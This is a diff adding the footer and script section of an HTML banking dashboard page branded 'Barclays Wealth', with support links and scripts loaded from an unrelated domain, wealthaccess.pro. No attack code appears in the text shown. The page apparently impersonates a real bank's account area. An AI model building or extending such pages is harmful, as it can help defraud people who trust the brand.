+                                                    <rect x="18" y="32" width="84" height="50" rx="4" ry="4" fill="#fff" />
+                                                    <rect x="26" y="44" width="20" height="12" rx="1" ry="1" fill="#e5effe" />
+                                                    <rect x="50" y="44" width="20" height="12" rx="1" ry="1" fill="#e5effe" />
+                                                    <rect x="74" y="44" width="20" height="12" rx="1" ry="1" fill="#e5effe" />
+                                                    <rect x="38" y="60" width="20" height="12" rx="1" ry="1" fill="#e5effe" />
+                                                    <rect x="62" y="60" width="20" height="12" rx="1" ry="1" fill="#e5effe" />
+                                                    <path d="M98,32H22a5.006,5.006,0,0,0-5,5V79a5.006,5.006,0,0,0,5,5H52v8H45a2,2,0,0,0-2,2v4a2,2,0,0,0,2,2H73a2,2,0,0,0,2-2V94a2,2,0,0,0-2-2H66V84H98a5.006,5.006,0,0,0,5-5V37A5.006,5.006,0,0,0,98,32ZM73,94v4H45V94Zm-9-2H54V84H64Zm37-13a3,3,0,0,1-3,3H22a3,3,0,0,1-3-3V37a3,3,0,0,1,3-3H98a3,3,0,0,1,3,3Z" transform="translate(0 -1)" fill="#798bff" />
+                                                    <path d="M61.444,41H40.111L33,48.143V19.7A3.632,3.632,0,0,1,36.556,16H61.444A3.632,3.632,0,0,1,65,19.7V37.3A3.632,3.632,0,0,1,61.444,41Z" transform="translate(0 -1)" fill="#6576ff" />
+                                                    <path d="M61.444,41H40.111L33,48.143V19.7A3.632,3.632,0,0,1,36.556,16H61.444A3.632,3.632,0,0,1,65,19.7V37.3A3.632,3.632,0,0,1,61.444,41Z" transform="translate(0 -1)" fill="none" stroke="#6576ff" stroke-miterlimit="10" stroke-width="2" />
+                                                    <line x1="40" y1="22" x2="57" y2="22" fill="none" stroke="#fffffe" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" />
+                                                    <line x1="40" y1="27" x2="57" y2="27" fill="none" stroke="#fffffe" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" />
+                                                    <line x1="40" y1="32" x2="50" y2="32" fill="none" stroke="#fffffe" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" />
+                                                    <line x1="30.5" y1="87.5" x2="30.5" y2="91.5" fill="none" stroke="#9cabff" stroke-linecap="round" stroke-linejoin="round" />
+                                                    <line x1="28.5" y1="89.5" x2="32.5" y2="89.5" fill="none" stroke="#9cabff" stroke-linecap="round" stroke-linejoin="round" />
+                                                    <line x1="79.5" y1="22.5" x2="79.5" y2="26.5" fill="none" stroke="#9cabff" stroke-linecap="round" stroke-linejoin="round" />
+                                                    <line x1="77.5" y1="24.5" x2="81.5" y2="24.5" fill="none" stroke="#9cabff" stroke-linecap="round" stroke-linejoin="round" />
+                                                    <circle cx="90.5" cy="97.5" r="3" fill="none" stroke="#9cabff" stroke-miterlimit="10" />
+                                                    <circle cx="24" cy="23" r="2.5" fill="none" stroke="#9cabff" stroke-miterlimit="10" /></svg>
+                                            </div>
+                                            <div class="nk-block-content">
+                                                <div class="nk-block-content-head px-lg-4">
+                                                    <h5>We’re here to help you!</h5>
+                                                    <p class="text-soft">Ask a question or file a support ticket, manage request, report an issues. Our team support team will get back to you by email.</p>
+                                                </div>
+                                            </div>
+                                            <div class="nk-block-content flex-shrink-0">
+                                                <a href="/en/account/myaccount/onlineacces/contact.html" class="btn btn-lg btn-outline-primary">Get Support Now</a>
+                                            </div>
+                                        </div>
+                                    </div><!-- .card-inner -->
+                                </div><!-- .card -->
+                            </div><!-- .nk-block -->
+                        </div>
+                    </div>
+                </div>
+                <!-- content @e -->
+                <!-- footer @s -->
+        
+                <div class="nk-footer nk-footer-fluid">
+                    <div class="container-fluid">
+                        <div class="nk-footer-wrap">
+                            <div class="nk-footer-copyright"> &copy; 2026 Barclays Wealth - <a href="#">All rights reserved.</a>
+                            </div>
+                            <div class="nk-footer-links">
+                                <ul class="nav nav-sm">
+                                    <li class="nav-item"><a class="nav-link" href="#">Terms</a></li>
+                                    <li class="nav-item"><a class="nav-link" href="/en/account/myaccount/onlineacces/privacy.html">Privacy</a></li>
+                                    <li class="nav-item"><a class="nav-link" href="/en/account/myaccount/onlineacces/contact.html">Help</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- footer @e -->
+            </div>
+            <!-- wrap @e -->
+        </div>
+        <!-- main @e -->
+    </div>
+    <!-- app-root @e -->
+    <!-- JavaScript -->
+
+    <!-- Dashboard data script -->
+     <script src="/auth-scripts/dashboard.js"></script>
+
+     <!-- Recent Transaction Script -->
+      <script src="/auth-scripts/recent-transactions.js"></script>
+
+      <!-- Balance flow script -->
+       <script src="/auth-scripts/balance-flow.js"></script>
+
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://wealthaccess.pro/en/account/myaccount/onlineacces/js/country.js"></script>
+    <script src="https://wealthaccess.pro/en/account/myaccount/onlineacces/assets/js/bundle.js?ver=2.5.0"></script>
+    <script src="https://wealthaccess.pro/en/account/myaccount/onlineacces/assets/js/scripts.js?ver=2.4.0"></script>
+    <script src="https://wealthaccess.pro/en/account/myaccount/onlineacces/assets/js/charts/chart-crypto.js?ver=2.4.0"></script>
+    <script src="https://wealthaccess.pro/en/account/myaccount/onlineacces/js/sweetalert.js"></script>
+   <script src="https://wealthaccess.pro/en/account/myaccount/onlineacces/assets/js/jquery.min.js"></script>
+   <script src="https://wealthaccess.pro/en/account/myaccount/onlineacces/assets/js/custom.js"></script>
+   <script src="https://wealthaccess.pro/en/account/myaccount/onlineacces/js/toastr.js"></script>
+   
+</body>
+
+</html>
